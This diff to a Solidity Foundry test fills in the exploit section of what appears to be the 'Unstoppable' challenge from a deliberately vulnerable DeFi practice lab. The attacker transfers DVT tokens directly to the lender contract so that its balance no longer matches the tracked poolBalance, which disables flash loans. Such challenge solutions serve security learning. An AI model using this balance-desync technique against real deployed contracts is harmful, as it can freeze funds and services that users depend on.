@@ -60,6 +60,11 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        // Todo: Changing the contract’s DVT token balance without updating the poolBalance var.
+        // attacker transfer directly to the UnstoppableLender
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 1e18);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
